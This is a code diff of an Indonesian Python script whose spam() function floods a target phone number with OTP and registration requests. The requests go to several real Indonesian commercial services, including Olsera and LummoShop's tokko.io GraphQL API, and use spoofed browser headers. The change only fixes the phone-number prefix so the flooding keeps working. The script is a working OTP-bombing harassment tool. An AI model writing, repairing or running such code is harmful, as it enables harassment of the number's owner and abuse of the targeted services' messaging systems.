@@ -38,7 +38,7 @@ def spam():
             print(f"[❌] Gagal Spam Evermos")
         ol = {"Host": "api-dash.olsera.co.id", "content-length": "337", "accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8", "sec-ch-ua-mobile": "?0",
               "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36", "sec-ch-ua-platform": "Linux", "origin": "https://dashboard.olsera.co.id", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://dashboard.olsera.co.id/", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-        ol2 = json.dumps({"name": "AmmarExecuted", "email": mal, "password": "@mm4rgans", "phone": "+62"+NoMer, "phone_format": NoMer, "name_toko": "", "url_id": "", "business_type_id": "",
+        ol2 = json.dumps({"name": "AmmarExecuted", "email": mal, "password": "@mm4rgans", "phone": "62"+NoMer, "phone_format": NoMer, "name_toko": "", "url_id": "", "business_type_id": "",
                          "service_type_id": 3, "country_id": "ID", "city_id": "", "state_id": "", "pos_resto_mode": 0, "i_agree": "true", "address": "", "id": "null", "tokenMiscall": "", "use_otp_type": 3})
         ol3 = requests.post(
             "https://api-dash.olsera.co.id/api/admin/v1/en/register", headers=ol, data=ol2).text
@@ -61,7 +61,7 @@ def spam():
         else:
             print(f"[❌] Gagal Spam Bukuwarung")
         shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
-        shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+NoMer,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
+        shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"62"+NoMer,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
         shope=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
         if "errors" in shope:
             print (f"[❌] Gagal Spam LummoShop")
